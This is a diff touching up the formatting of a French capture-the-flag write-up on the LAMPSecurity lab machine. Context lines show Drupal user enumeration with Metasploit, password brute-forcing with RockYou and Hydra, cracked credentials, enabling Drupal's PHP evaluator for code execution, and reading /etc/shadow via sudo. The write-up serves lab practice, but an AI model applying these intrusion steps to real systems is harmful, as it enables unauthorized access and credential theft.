@@ -183,7 +183,7 @@ $db_url = 'mysqli://root:JumpUpAndDown@localhost/drupal';
 
 Malheureusement ce mot de passe ne permet pas de passer root (ce serais un peu simple) :  
 
-```
+```console
 $ ssh root@192.168.1.60
 Welcome to LAMPSecurity Research SSH access!
 #flag#5e937c51b852e1ee90d42ddb5ccb8997
@@ -193,15 +193,15 @@ root@192.168.1.60's password:
 Permission denied, please try again.
 ```
 
-Remarquez qu'un peu partout on trouve des flags qui devaient sans doute servir à valider des étapes mais je ne m'y attarderai pas, l'objectif est d'arriver à obtenir l'accès root.  
+Remarquez qu'un peu partout on trouve des flags qui devaient sans doute servir à valider des étapes, mais je ne m'y attarderai pas, l'objectif est d'arriver à obtenir l'accès root.  
 
 Le serveur MySQL n'autorise malheureusement pas non plus les connexions distantes de l'utilisateur root. Il faut donc fouiner ailleurs.  
 
-Sur le ftp publique on trouve un fichier *key* téléchargeable avec comme contenu *#flag#5eb798d41d2e53295d34005f49113fc0*.  
+Sur le ftp publique on trouve un fichier `key` téléchargeable avec comme contenu `#flag#5eb798d41d2e53295d34005f49113fc0`.  
 
 On peut visualiser la liste des partages SMB mais après impossible d'y accéder en utilisateur anonyme (smbclient retourne une erreur) :  
 
-```
+```console
 $ nmblookup -A 192.168.1.60
 Looking up status of 192.168.1.60
         LAMPSEC         <00> -         B <ACTIVE> 
@@ -287,9 +287,9 @@ msf auxiliary(drupal_views_user_enum) > exploit
 [*] Auxiliary module execution completed
 ```
 
-On obtient une liste d'utilisateur mais elle n'est pas forcément appropriée pour une attaque brute-force : on dispose des prénoms et non des logins.  
+On obtient une liste d'utilisateur, mais elle n'est pas forcément appropriée pour une attaque brute-force : on dispose des prénoms et non des logins.  
 
-Sur la page /profile des liens vers les différents profils avec les adresses emails. Il suffit de récupérer cela en retirant le *@localhost.localdomain* final.  
+Sur la page `/profile` des liens vers les différents profils avec les adresses emails. Il suffit de récupérer cela en retirant le *@localhost.localdomain* final.  
 
 ```
 bdio
@@ -313,19 +313,19 @@ tmaloney
 xbruce
 ```
 
-A noter que sur le *Drupal* on peut trouver des articles que l'on ne voit pas normalement mais qui restent accessibles si on devine l'ID de l'article.  
+À noter que sur le *Drupal* on peut trouver des articles que l'on ne voit pas normalement, mais qui restent accessibles si on devine l'ID de l'article.  
 
-Ainsi sur /comment/reply/28 on trouve #flag#57dbe55b42b307fb4115146d239955d0.  
+Ainsi sur `/comment/reply/28` on trouve `#flag#57dbe55b42b307fb4115146d239955d0`.  
 
-A /phpinfo.php il y a un phpinfo() avec #flag#550e1bafe077ff0b0b67f4e32f29d751.  
+A `/phpinfo.php` il y a un `phpinfo()` avec` #flag#550e1bafe077ff0b0b67f4e32f29d751`.  
 
 Tout ça ne nous avance pas vraiment. Finalement j'ai trouvé [un article](http://www.madirish.net/408) sur le site de *MadIrish* (ben tiens) où l'on peut trouver un script Python de brute-force de comptes *Drupal*.  
 
-Le script est un peu buggé et peu performant. Je n'ai pas pris la peine de le réécrire mais vous devriez au moins ajouter deux break sans quoi le script continue de brute-forcer un compte même s'il vient de trouver le mot de passe !  
+Le script est un peu buggé et peu performant. Je n'ai pas pris la peine de le réécrire, mais vous devriez au moins ajouter deux break sans quoi le script continue de brute-forcer un compte même s'il vient de trouver le mot de passe !  
 
-Après avoir testé une petite wordlist pour les mots de passe j'ai utilisé celle de *RockYou* que *MadIrish* semble utiliser pour ses challenges.  
+Après avoir testé une petite wordlist pour les mots de passe, j'ai utilisé celle de *RockYou* que *MadIrish* semble utiliser pour ses challenges.  
 
-```
+```console
 $ python drupal_bruterforce.py --target=http://192.168.1.60/ --userlist=users.txt --wordlist=rockyou.txt  --version=6
 Please wait, working...
 Drupal 6
@@ -334,13 +334,13 @@ admin:football123
 barbara:passw0rd
 ```
 
-J'ai pas eu le courage d'aller jusqu'à la fin des utilisateurs. L'important est de disposer du compte admin *Drupal*.  
+Je n'ai pas eu le courage d'aller jusqu'à la fin des utilisateurs. L'important est de disposer du compte admin *Drupal*.  
 
 Finalement le plus dur dans ce challenge aura été de trouver comment placer du \*biiip\* code PHP dans cette \*biiip\* de *Drupal* de \*biiip\* (\*biiip\* !).  
 
 Donc avis à la populace, il faut d'abord s'assurer que le module *"Input formats"* est bien activé dans les modules (*modules > Filter*).  
 
-Dans les *Input formats* il faut alors s'assurer que *PHP code* est présent et que son option *PHP evaluator* est cochée.  
+Dans les *Input formats,* il faut alors s'assurer que *PHP code* est présent et que son option *PHP evaluator* est cochée.  
 
 Et enfin lors de l'édition d'un contenu (article, etc.) il faut switcher le *Input format* sur *PHP code*.  
 
@@ -378,7 +378,7 @@ Vici
 
 Je réutilise les identifiants *Drupal* pour tenter de trouver un compte Unix :  
 
-```
+```console
 $ ./hydra -L users.txt -P passwords.txt ssh://192.168.1.60
 Hydra v8.0 (c) 2014 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.
 
@@ -404,7 +404,7 @@ Last login: Thu Mar 27 12:48:29 2014 from 192.168.56.1
 
 Dans l'historique bash de *M. Pinkton* on trouve beaucoup de commandes sudo. En fait l'utilisateur peut lancer tout ce qu'il souhaite :  
 
-```
+```console
 [spinkton@localhost ~]$ sudo head -1 /etc/shadow
 root:$1$.GWA7rU/$lVPNjveio2K8Hpsuk.6N4/:15861:0:99999:7:::
 ```
